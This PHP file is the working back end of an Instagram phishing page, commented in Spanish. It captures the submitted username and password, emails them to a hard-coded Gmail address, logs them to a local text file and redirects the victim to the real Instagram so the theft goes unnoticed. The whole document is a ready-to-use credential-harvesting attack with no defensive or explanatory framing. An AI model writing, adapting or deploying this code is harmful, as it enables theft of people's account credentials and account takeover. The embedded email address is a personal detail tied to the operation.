<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Información para enviar al correo
    $to = 'flein649@gmail.com';
    $subject = 'Instagram Login Attempt';
    $message = "Username: $username\nPassword: $password";
    $headers = 'From: no-reply@yourdomain.com' . "\r\n" .
               'Reply-To: no-reply@yourdomain.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Enviar el correo con las credenciales
    mail($to, $subject, $message, $headers);

    // Guardar en log.txt como respaldo (opcional)
    file_put_contents("log.txt", "Username: $username, Password: $password\n", FILE_APPEND);

    // Redirigir a la página real de Instagram
    header("Location: https://www.instagram.com/");
    exit();
}
?>
